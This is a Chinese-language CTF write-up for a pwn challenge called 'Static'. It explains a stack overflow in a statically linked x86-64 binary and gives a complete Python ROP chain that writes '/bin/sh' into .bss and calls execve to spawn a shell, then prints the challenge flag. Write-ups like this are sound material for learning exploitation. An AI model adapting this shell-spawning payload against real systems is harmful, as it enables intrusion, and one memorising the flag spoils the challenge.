# Static

## 题目简述

静态链接、无 PIE 的 x86-64 程序把最多 256 字节读入 10 字节栈缓冲区。没有现成 `system`/动态 libc 泄露链，但静态二进制包含足够多的 ROP gadget，可以直接构造 `execve("/bin/sh", NULL, NULL)`。

## 解题过程

循环模式定位得到保存 RIP 偏移为 18。选择 `.bss` 中可写地址 `0x4a0000`，先用写内存 gadget 放入 `/bin/sh\0`，再设置系统调用寄存器：

```python
payload  = b"A" * 18
payload += p64(0x401fe0) + p64(0x0068732f6e69622f)  # pop rdi
payload += p64(0x41069c) + p64(0x4a0000)            # pop rax
payload += p64(0x46718c) + p64(0)                   # [rax]=rdi; pop rbx

payload += p64(0x401fe0) + p64(0x4a0000)            # rdi -> "/bin/sh"
payload += p64(0x44baf2)                            # rdx = 0
payload += p64(0x42f6b8) + p64(0)                   # rsi = 0; pop rbx
payload += p64(0x41069c) + p64(59)                  # rax = SYS_execve
payload += p64(0x401194)                            # syscall
```

地址来自题目附件对应的静态二进制，换编译版本必须重新搜 gadget。执行后读取：

```text
byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}
```

## 方法总结

静态链接会失去简短的 ret2libc 路径，却提供更大的 gadget 集合与固定地址。通用思路是“写字符串到可写区 → 设置 `rdi/rsi/rdx/rax` → `syscall`”，并逐个核对 gadget 的副作用与栈消耗。
